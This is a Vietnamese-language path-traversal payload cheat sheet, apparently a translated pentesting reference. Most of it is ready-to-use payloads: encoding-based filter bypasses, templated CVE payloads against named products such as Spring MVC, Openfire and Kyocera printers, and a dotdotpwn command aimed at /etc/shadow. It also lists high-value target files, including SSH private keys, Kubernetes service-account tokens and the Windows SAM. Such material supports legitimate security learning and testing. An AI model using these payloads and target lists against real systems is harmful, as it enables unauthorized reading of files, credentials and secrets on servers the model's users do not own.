# Directory Traversal (Dò Tìm Đường Dẫn)

> Path Traversal, còn được gọi là Directory Traversal, là một loại lỗ hổng bảo mật xảy ra khi kẻ tấn công thao túng các biến tham chiếu đến tệp bằng chuỗi "dot-dot-slash (../)" hoặc các cấu trúc tương tự. Điều này có thể cho phép kẻ tấn công truy cập vào các tệp và thư mục tùy ý được lưu trữ trên hệ thống tệp.

## Tóm tắt

* [Công cụ](#tools)
* [Phương pháp](#methodology)
    * [URL Encoding](#url-encoding)
    * [Double URL Encoding](#double-url-encoding)
    * [Unicode Encoding](#unicode-encoding)
    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
    * [Đường dẫn bị làm rối (Mangled Path)](#mangled-path)
    * [NULL Bytes](#null-bytes)
    * [Triển khai URL qua Reverse Proxy](#reverse-proxy-url-implementation)
* [Khai thác](#exploit)
    * [UNC Share](#unc-share)
    * [ASPNET Cookieless](#asp-net-cookieless)
    * [IIS Short Name](#iis-short-name)
    * [Java URL Protocol](#java-url-protocol)
* [Path Traversal](#path-traversal)
    * [Tệp Linux](#linux-files)
    * [Tệp Windows](#windows-files)
* [Labs](#labs)
* [Tài liệu tham khảo](#references)

## Công cụ

* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - Công cụ Fuzzer dò tìm Directory Traversal

    ```powershell
    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
    ```

## Phương pháp

Chúng ta có thể sử dụng các ký tự `..` để truy cập vào thư mục cha, các chuỗi sau đây là một số cách mã hóa có thể giúp bạn vượt qua một bộ lọc được triển khai kém.

```powershell
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
```

### URL Encoding

| Ký tự | Đã mã hóa |
| --------- | ------- |
| `.`       | `%2e`   |
| `/`       | `%2f`   |
| `\`       | `%5c`   |

**Ví dụ:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion

```ps1
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

### Double URL Encoding

Double URL encoding là quá trình áp dụng mã hóa URL hai lần lên một chuỗi. Trong mã hóa URL, các ký tự đặc biệt được thay thế bằng dấu % theo sau là giá trị ASCII thập lục phân của chúng. Mã hóa kép lặp lại quá trình này trên chuỗi đã được mã hóa.

| Ký tự | Đã mã hóa |
| --------- | ------- |
| `.`       | `%252e` |
| `/`       | `%252f` |
| `\`       | `%255c` |

**Ví dụ:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)

```ps1
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

### Unicode Encoding

| Ký tự | Đã mã hóa  |
| --------- | -------- |
| `.`       | `%u002e` |
| `/`       | `%u2215` |
| `\`       | `%u2216` |

**Ví dụ**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)

```js
{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
```

### Overlong UTF-8 Unicode Encoding

Tiêu chuẩn UTF-8 quy định rằng mỗi codepoint phải được mã hóa bằng số byte tối thiểu cần thiết để biểu diễn các bit có nghĩa của nó. Bất kỳ cách mã hóa nào sử dụng nhiều byte hơn mức cần thiết đều được gọi là "overlong" và được coi là không hợp lệ theo đặc tả UTF-8. Quy tắc này đảm bảo ánh xạ một-một giữa các codepoint và cách mã hóa hợp lệ của chúng, đảm bảo rằng mỗi codepoint chỉ có một cách biểu diễn duy nhất.

| Ký tự | Đã mã hóa                         |
| --------- | ------------------------------- |
| `.`       | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
| `/`       | `%c0%af`, `%e0%80%af`, `%c0%2f` |
| `\`       | `%c0%5c`, `%c0%80%5c`           |

### Đường dẫn bị làm rối (Mangled Path)

Đôi khi bạn sẽ gặp một WAF loại bỏ các ký tự `../` khỏi chuỗi, chỉ cần nhân đôi chúng lên.

```powershell
..././
...\.\
```

**Ví dụ:**: Mirasys DVMS Workstation <=5.12.6

```ps1
{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
```

### NULL Bytes

Một byte null (`%00`), còn được gọi là ký tự null, là một ký tự điều khiển đặc biệt (0x00) trong nhiều ngôn ngữ lập trình và hệ thống. Nó thường được dùng làm ký tự kết thúc chuỗi trong các ngôn ngữ như C và C++. Trong các cuộc tấn công directory traversal, byte null được dùng để thao túng hoặc vượt qua các cơ chế kiểm tra đầu vào phía máy chủ.

**Ví dụ:** Homematic CCU3 CVE-2019-9726

```js
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Ví dụ:** Kyocera Printer d-COPIA253MF CVE-2020-23575

```js
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### Triển khai URL qua Reverse Proxy

Nginx coi `/..;/` là một thư mục trong khi Tomcat lại xử lý nó như thể là `/../`, điều này cho phép chúng ta truy cập vào các servlet tùy ý.

```powershell
..;/
```

**Ví dụ**: Pascom Cloud Phone System CVE-2021-45967

Một lỗi cấu hình giữa NGINX và máy chủ Tomcat phía sau dẫn đến lỗ hổng path traversal trên máy chủ Tomcat, làm lộ ra các endpoint không mong muốn.

```js
{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
```

## Khai thác

Các khai thác này ảnh hưởng đến cơ chế liên quan đến các công nghệ cụ thể.

### UNC Share

UNC (Universal Naming Convention) share là một định dạng chuẩn được dùng để chỉ định vị trí của các tài nguyên, chẳng hạn như tệp, thư mục hoặc thiết bị được chia sẻ, trên mạng theo cách không phụ thuộc vào nền tảng. Nó thường được dùng trong môi trường Windows nhưng cũng được các hệ điều hành khác hỗ trợ.

Kẻ tấn công có thể chèn một UNC share của **Windows** (`\\UNC\share\name`) vào một hệ thống phần mềm để có thể chuyển hướng truy cập đến một vị trí hoặc tệp tùy ý không mong muốn.

```powershell
\\localhost\c$\windows\win.ini
```

Ngoài ra, máy chủ cũng có thể xác thực trên share từ xa này, do đó gửi đi một trao đổi NTLM.

### ASP NET Cookieless

Khi tính năng cookieless session state được bật. Thay vì dựa vào cookie để nhận diện phiên làm việc, ASP.NET sẽ chỉnh sửa URL bằng cách nhúng trực tiếp Session ID vào đó.

Ví dụ, một URL thông thường có thể được chuyển đổi từ: `http://example.com/page.aspx` thành dạng như: `http://example.com/(S(lit3py55t21z5v55vlm25s55))/page.aspx`. Giá trị nằm trong `(S(...))` chính là Session ID.

| Phiên bản .NET | URI                        |
| ------------ | -------------------------- |
| V1.0, V1.1   | /(XXXXXXXX)/               |
| V2.0+        | /(S(XXXXXXXX))/            |
| V2.0+        | /(A(XXXXXXXX)F(YYYYYYYY))/ |
| V2.0+        | ...                        |

Chúng ta có thể tận dụng hành vi này để vượt qua các URL bị lọc.

* Nếu ứng dụng của bạn nằm trong thư mục chính

    ```ps1
    /(S(X))/
    /(Y(Z))/
    /(G(AAA-BBB)D(CCC=DDD)E(0-1))/
    /(S(X))/admin/(S(X))/main.aspx
    /(S(x))/b/(S(x))in/Navigator.dll
    ```

* Nếu ứng dụng của bạn nằm trong thư mục con

    ```ps1
    /MyApp/(S(X))/
    /admin/(S(X))/main.aspx
    /admin/Foobar/(S(X))/../(S(X))/main.aspx
    ```

| CVE            | Payload                                        |
| -------------- | ---------------------------------------------- |
| CVE-2023-36899 | /WebForm/(S(X))/prot/(S(X))ected/target1.aspx  |
| -              | /WebForm/(S(X))/b/(S(X))in/target2.aspx        |
| CVE-2023-36560 | /WebForm/pro/(S(X))tected/target1.aspx/(S(X))/ |
| -              | /WebForm/b/(S(X))in/target2.aspx/(S(X))/       |

### IIS Short Name

Lỗ hổng IIS Short Name khai thác một điểm bất thường trong máy chủ web Internet Information Services (IIS) của Microsoft, cho phép kẻ tấn công xác định sự tồn tại của các tệp hoặc thư mục có tên dài hơn định dạng 8.3 (còn gọi là short file name) trên máy chủ web.

* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)

    ```ps1
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
    ```

* [bitquark/shortscan](https://github.com/bitquark/shortscan)

    ```ps1
    shortscan http://example.org/
    ```

### Java URL Protocol

Giao thức URL của Java khi `new URL('')` được sử dụng cho phép định dạng `url:URL`

```powershell
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

## Path Traversal

### Tệp Linux

* Hệ điều hành và thông tin

    ```powershell
    /etc/issue
    /etc/group
    /etc/hosts
    /etc/motd
    ```

* Các tiến trình

    ```ps1
    /proc/[0-9]*/fd/[0-9]*   # số đầu tiên là PID, số thứ hai là filedescriptor
    /proc/self/environ
    /proc/version
    /proc/cmdline
    /proc/sched_debug
    /proc/mounts
    ```

* Mạng

    ```ps1
    /proc/net/arp
    /proc/net/route
    /proc/net/tcp
    /proc/net/udp
    ```

* Đường dẫn hiện tại

    ```ps1
    /proc/self/cwd/index.php
    /proc/self/cwd/main.py
    ```

* Lập chỉ mục

    ```ps1
    /var/lib/mlocate/mlocate.db
    /var/lib/plocate/plocate.db
    /var/lib/mlocate.db
    ```

* Thông tin xác thực và lịch sử

    ```ps1
    /etc/passwd
    /etc/shadow
    /home/$USER/.bash_history
    /home/$USER/.ssh/id_rsa
    /etc/mysql/my.cnf
    ```

* Kubernetes

    ```ps1
    /run/secrets/kubernetes.io/serviceaccount/token
    /run/secrets/kubernetes.io/serviceaccount/namespace
    /run/secrets/kubernetes.io/serviceaccount/certificate
    /var/run/secrets/kubernetes.io/serviceaccount
    ```

### Tệp Windows

Các tệp `license.rtf` và `win.ini` luôn hiện diện trên các hệ thống Windows hiện đại, khiến chúng trở thành mục tiêu đáng tin cậy để kiểm thử các lỗ hổng path traversal. Mặc dù nội dung của chúng không đặc biệt nhạy cảm hay thú vị, nhưng chúng phục vụ tốt như một bằng chứng khái niệm (proof of concept).

```powershell
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

Danh sách các tệp / đường dẫn cần dò khi có thể đọc tệp tùy ý trên hệ điều hành Microsoft Windows: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)

```powershell
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system32/inetsrv/metabase.xml
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/system volume information/wpsettings.dat
c:/system32/inetsrv/metabase.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/windows/repair/sam
c:/windows/repair/system
```

## Labs

* [PortSwigger - File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
* [PortSwigger - File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
* [PortSwigger - File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
* [PortSwigger - File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
* [PortSwigger - File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
* [PortSwigger - File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)

## Tài liệu tham khảo

* [Cookieless ASPNET - Soroush Dalili - March 27, 2023](https://web.archive.org/web/20241202163755/https://twitter.com/irsdl/status/1640390106312835072)
* [CWE-40: Path Traversal: '\\UNC\share\name\' (Windows UNC Share) - CWE Mitre - December 27, 2018](https://web.archive.org/web/20080115180212/http://cwe.mitre.org:80/data/definitions/40.html)
* [Directory traversal - Portswigger - March 30, 2019](https://web.archive.org/web/20190330191447/https://portswigger.net/web-security/file-path-traversal)
* [Directory traversal attack - Wikipedia - August 5, 2024](https://web.archive.org/web/20111013162219/http://en.wikipedia.org:80/wiki/Directory_traversal_attack)
* [EP 057 | Proc filesystem tricks & locatedb abuse with @_remsio_ & @_bluesheet - TheLaluka - November 30, 2023](https://web.archive.org/web/20240323234120/https://youtu.be/YlZGJ28By8U)
* [Exploiting Blind File Reads / Path Traversal Vulnerabilities on Microsoft Windows Operating Systems - @evisneffos - June 19, 2018](https://web.archive.org/web/20200919055801/http://www.soffensive.com/2018/06/exploiting-blind-file-reads-path.html)
* [NGINX may be protecting your applications from traversal attacks without you even knowing - Rotem Bar - September 24, 2020](https://medium.com/appsflyer/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d?source=friends_link&sk=e9ddbadd61576f941be97e111e953381)
* [Path Traversal Cheat Sheet: Windows - @HollyGraceful - May 17, 2015](https://web.archive.org/web/20170123115404/https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/)
* [Understand How the ASP.NET Cookieless Feature Works - Microsoft Documentation - June 24, 2011](https://learn.microsoft.com/en-us/previous-versions/dotnet/articles/aa479315(v=msdn.10))
